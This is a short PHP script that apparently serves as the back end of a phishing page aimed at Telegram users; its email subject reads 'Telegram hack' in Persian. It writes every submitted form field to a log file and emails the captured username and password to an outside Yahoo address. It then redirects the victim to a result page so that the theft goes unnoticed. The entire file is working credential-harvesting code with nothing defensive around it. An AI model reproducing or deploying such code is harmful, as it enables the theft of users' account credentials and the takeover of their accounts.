<?php
header ('Location:/result.htm');
$handle = fopen("soawa.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'rm_286@yahoo.com';
$subject = 'هک تلگرام';
$username = $_GET['username'];
$password = $_GET['password'];
$message = "Username:" . $username . "<br>" . "Password: " . $password;
$headers = 'From: rm_286@yahoo.com' . "\r\n" .
    'Reply-To: rm_286@yahoo.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>
